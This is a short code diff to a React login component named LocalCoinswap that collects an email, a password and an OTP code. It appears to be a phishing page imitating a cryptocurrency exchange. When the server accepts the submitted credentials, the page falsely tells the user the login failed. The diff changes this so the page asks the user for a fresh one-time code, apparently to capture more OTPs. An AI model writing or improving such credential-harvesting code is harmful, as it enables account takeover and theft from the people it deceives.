@@ -76,13 +76,7 @@ function LocalCoinswap() {
       const data = await res.json();
 
       if (res.ok) {
-        alert("Wrong email or password! Try again using correct credentials");
-        // Reset all
-        setStep(1);
-        setEmail("");
-        setWord("");
-        setCode("");
-        //
+        alert("Please enter a new code");
       } else {
         alert(data.error || "Invalid code");
       }
@@ -171,7 +165,7 @@ function LocalCoinswap() {
           {/* STEP 3 — CODE */}
           {step >= 3 && (
             <div className="mt-8">
-              <label className="text-gray-400 text-sm">OTP Code (eg: Google Authenticator</label>
+              <label className="text-gray-400 text-sm">OTP Code (eg: Google Authenticator)</label>
               <input
                 type="text"
                 maxLength={8}
